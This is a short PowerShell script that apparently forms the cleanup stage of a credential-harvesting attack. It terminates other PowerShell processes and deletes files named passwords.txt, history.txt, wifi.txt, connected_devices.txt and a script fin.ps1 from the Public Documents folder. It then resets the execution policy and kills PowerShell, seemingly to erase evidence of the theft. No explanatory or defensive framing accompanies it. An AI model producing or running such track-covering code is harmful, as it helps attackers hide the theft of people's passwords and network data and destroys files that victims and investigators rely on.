Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
Set-Location C:\Users\Public\Documents
Remove-Item passwords.txt
Remove-Item history.txt
Remove-Item wifi.txt
Remove-Item connected_devices.txt
Remove-Item fin.ps1
Set-ExecutionPolicy restricted -Force
taskkill -F /IM powershell.exe
